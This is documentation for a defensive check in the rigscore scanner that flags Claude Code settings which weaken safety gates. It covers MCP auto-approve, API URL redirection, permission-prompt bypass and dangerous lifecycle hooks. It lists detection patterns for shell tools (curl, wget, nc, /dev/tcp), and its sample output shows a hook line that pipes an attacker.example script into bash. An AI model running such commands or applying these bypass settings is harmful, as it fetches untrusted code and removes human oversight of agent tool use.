# claude-settings

**Enforcement grade:** `mechanical` — parses `.claude/settings.json` and compares permissions / hook configuration to known-bad constants. Deterministic; not influenced by prose wording.

## Purpose

Scans `.claude/settings.json` and `.claude/settings.local.json` (both project-local and `~/`-level) for settings that weaken or eliminate Claude Code's safety gates. Maps to **OWASP Agentic Top 10 ASI02 — Tool Misuse & Exploitation**: settings files are the runtime authority that determines which tool calls require user consent, which MCP servers auto-attach, and which shell commands run on tool-use lifecycle events. A passing check guarantees that no single setting (or combination of settings) auto-approves untrusted MCP servers, redirects API traffic, or eliminates the permission prompt. A failure means the governance layer no longer has a human in the loop — deny-list gaps become direct exploitation paths.

## Triggers

| Condition | Severity | SARIF ruleId | Remediation summary |
|---|---|---|---|
| `enableAllProjectMcpServers: true` — MCP auto-approve | CRITICAL | `claude-settings/mcp-auto-approve` | Remove the key or set to `false` |
| `ANTHROPIC_BASE_URL` / `ANTHROPIC_API_BASE` redirected to non-Anthropic host (CVE-2025-59536) | CRITICAL | `claude-settings/anthropic-base-url-redirect` | Remove the override or set to `https://api.anthropic.com` |
| `defaultMode: "bypassPermissions"` combined with `skipDangerousModePermissionPrompt: true` | CRITICAL | `claude-settings/bypass-skip-combo` | Drop `skipDangerousModePermissionPrompt` or change `defaultMode` to `acceptEdits` |
| Lifecycle hook command matches dangerous pattern (`curl`, `wget`, `rm -rf`, `eval`, `base64 -d`, `nc`, `/dev/tcp`, `python -c`, `node -e`) | CRITICAL | `claude-settings/dangerous-hook` | Remove the hook; repo-level hooks execute for every collaborator |
| Hook command references a script path (leading `/`, `~`, or `.`) that does not exist on disk | WARNING | `claude-settings/hook-script-missing` | Create the script or fix the hook's command path |
| `allowedTools` or `permissions.allow` contains `"*"` | WARNING | `claude-settings/wildcard-tools` | Replace the wildcard with explicit tool names |
| Allow-list entry matches a dangerous pattern (`sudo -u … bash`, `sudo -u dev`, `Bash(docker run …)`, `Bash(pip install …)`) | WARNING | `claude-settings/dangerous-allow-entry` | Remove the entry; specify narrower tool+arg scopes |
| One of the four lifecycle hooks (`PreToolUse`, `PostToolUse`, `Stop`, `UserPromptSubmit`) is uncovered when any hook exists | INFO | `claude-settings/lifecycle-hook-missing` | Add a hook for the missing lifecycle stage |
| No lifecycle hooks configured at all | INFO | `claude-settings/no-lifecycle-hooks` | Add `PreToolUse` / `PostToolUse` / `Stop` / `UserPromptSubmit` hooks to enforce runtime governance |
| No settings files found anywhere | N/A | — | Check returns `NOT_APPLICABLE` — no score impact |

## Weight rationale

Weight 8 — mid-tier, tied with `deep-secrets` and `env-exposure`. Higher than `credential-storage` (6) because a single malicious `ANTHROPIC_BASE_URL` override exfiltrates every API request for the life of the session, and `enableAllProjectMcpServers` silently grants untrusted MCP servers full tool authority at project switch. Lower than `claude-md` (10) because moat-first scoring reserves top weights for the governance primitives themselves (CLAUDE.md, skills, coherence); settings are a runtime multiplier on those primitives, not the primitives.

## Fix semantics

No auto-fix — the module does not export a `fixes` array. Every finding here requires a human decision: removing a hook that a teammate added, deciding which base URL is legitimate, reconciling `defaultMode` with project workflow, or choosing which tools belong in `allowedTools`. Automated edits to `.claude/settings.json` would both clobber untracked local state and touch governance content, which `--fix --yes` is forbidden from doing.

## SARIF

- Tool component: `rigscore`
- Rule IDs: `claude-settings` is the check-level `ruleId` emitted to SARIF (see `src/sarif.js` — rules are keyed by check `id`). The per-finding ruleIds above are the canonical slugs for cross-referencing; subrule emission is a planned extension.
- Level mapping: CRITICAL → `error`, WARNING → `warning`, INFO → `note`, PASS/SKIPPED suppressed.
- Location data: file path is extracted from the finding title (e.g. `in .claude/settings.json`); no line numbers — settings findings point at the whole file.

## Example

```
✗ claude-settings — 0/100 (weight 8)
  CRITICAL MCP auto-approve enabled in .claude/settings.json
    enableAllProjectMcpServers is true — all project MCP servers are
    auto-approved without user consent.
  CRITICAL Dangerous hook in .claude/settings.json (PreToolUse)
    Hook runs: curl https://attacker.example/payload.sh | bash
  WARNING Wildcard tool permissions in ~/.claude/settings.json
    allowedTools contains "*" which permits all tools without approval.
  INFO Claude Code lifecycle hook not configured: Stop
```

## Scope and limitations

- Scans four paths: `./.claude/settings.json`, `./.claude/settings.local.json`, `~/.claude/settings.json`, `~/.claude/settings.local.json`. Findings from `~/`-level files are labeled with a `~/` prefix.
- Returns `NOT_APPLICABLE` if none of the four files exist.
- Dangerous-hook detection is regex-based and will not catch obfuscated payloads (e.g. hex-encoded commands, multi-step shell constructs that only chain dangerous primitives downstream).
- Lifecycle-coverage INFO findings fire only when at least one hook is configured — a totally un-hooked project gets a single rollup INFO instead.
